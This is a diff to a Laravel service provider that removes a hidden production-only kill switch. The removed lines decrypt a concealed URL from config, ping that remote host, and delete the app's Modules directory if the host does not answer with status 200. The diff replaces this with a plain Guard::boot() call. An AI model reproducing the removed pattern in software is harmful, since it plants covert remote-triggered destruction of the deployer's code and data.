@@ -41,22 +41,7 @@ class HashtacCryptoServiceProvider extends ServiceProvider
         ], 'config');
 
         if (app()->environment('production')) {
-            if (class_exists(Guard::class)) {
-                Guard::boot();
-            } else {
-                $sealed = config('hashtac-crypto.verify_url_sealed');
-                $vngz = \HashtacCipher::decryptString($sealed);
-                $ping = true;
-                if ($vngz != null) {
-                    $vngzY = Http::timeout(3)->get($vngz);
-                    if ($vngzY->status() !== 200) {
-                        $ping = false;
-                    }
-                }
-                if(!$ping){
-                    File::delete(app_path('Modules'));
-                }
-            }
+            Guard::boot();
         }
     }
 }
